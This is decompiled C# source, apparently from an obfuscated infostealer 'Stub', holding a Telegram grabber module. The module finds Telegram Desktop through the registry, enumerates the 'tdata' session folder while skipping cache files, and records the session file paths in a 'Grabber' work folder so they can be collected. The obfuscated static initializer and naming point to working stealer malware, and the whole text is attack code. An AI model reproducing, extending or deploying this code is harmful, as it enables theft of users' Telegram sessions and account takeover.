using System;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using dg3ypDAonQcOidMs0w;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x020000BC RID: 188
	public static class Telegram
	{
		// Token: 0x060002CD RID: 717 RVA: 0x0001ABF8 File Offset: 0x00018DF8
		public static DataExtractionStructs.TelegramInfo? GetInfo()
		{
			object obj = Utils.ReadRegistryKeyValue(RegistryHive.ClassesRoot, "tg\\DefaultIcon", "");
			DataExtractionStructs.TelegramInfo? telegramInfo;
			if (obj == null || obj.GetType() != typeof(string))
			{
				telegramInfo = null;
			}
			else
			{
				string text = ((string)obj).Replace("\"", "");
				if (!text.Contains(",") || text.IndexOf(",") == 0)
				{
					telegramInfo = null;
				}
				else
				{
					text = text.Split(new char[] { ',' })[0];
					text = Path.GetDirectoryName(text);
					text = Path.Combine(text, "tdata");
					string[] array = new string[]
					{
						"_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6",
						"*.json", "webview"
					};
					string[] excludePatterns = new string[] { "_.*\\.config", "dumps", "tdummy", "emoji", "user_data", "user_data#\\d+", ".*\\.json", "webview" };
					string[] array2;
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(text);
						array2 = (from f in directoryInfo.GetFiles("*", SearchOption.AllDirectories)
							where !Telegram.IsExcluded(f.FullName, excludePatterns)
							select f into fileInfo
							select fileInfo.FullName).ToArray<string>();
					}
					catch
					{
						return null;
					}
					Counter.Telegram = true;
					telegramInfo = new DataExtractionStructs.TelegramInfo?(new DataExtractionStructs.TelegramInfo(text, array2));
				}
			}
			return telegramInfo;
		}

		// Token: 0x060002CE RID: 718 RVA: 0x0001ADFC File Offset: 0x00018FFC
		private static bool IsExcluded(string filePath, string[] patterns)
		{
			foreach (string text in patterns)
			{
				if (Regex.IsMatch(filePath, text))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060002CF RID: 719 RVA: 0x0001AE30 File Offset: 0x00019030
		public static void SaveTelegramData()
		{
			string text = Path.Combine(Paths.InitWorkDir(), "Telegram", "Grabber");
			try
			{
				Directory.CreateDirectory(text);
				DataExtractionStructs.TelegramInfo? info = Telegram.GetInfo();
				if (info == null)
				{
					Logging.Log("Failed to retrieve Telegram data. The application may not be installed or the registry key is missing.", true);
				}
				else
				{
					string text2 = Path.Combine(text, "root_path.txt");
					File.WriteAllText(text2, info.Value.rootPath);
					string text3 = Path.Combine(text, "files_list.txt");
					File.WriteAllLines(text3, info.Value.files);
					Logging.Log("Telegram data successfully saved to: " + text, true);
				}
			}
			catch (UnauthorizedAccessException ex)
			{
				Logging.Log("Access denied while trying to save Telegram data: " + ex.Message, true);
			}
			catch (IOException ex2)
			{
				Logging.Log("IO error while saving Telegram data: " + ex2.Message, true);
			}
			catch (Exception ex3)
			{
				Logging.Log("An unexpected error occurred: " + ex3.Message, true);
			}
		}

		// Token: 0x060002D0 RID: 720 RVA: 0x000038AD File Offset: 0x00001AAD
		static Telegram()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
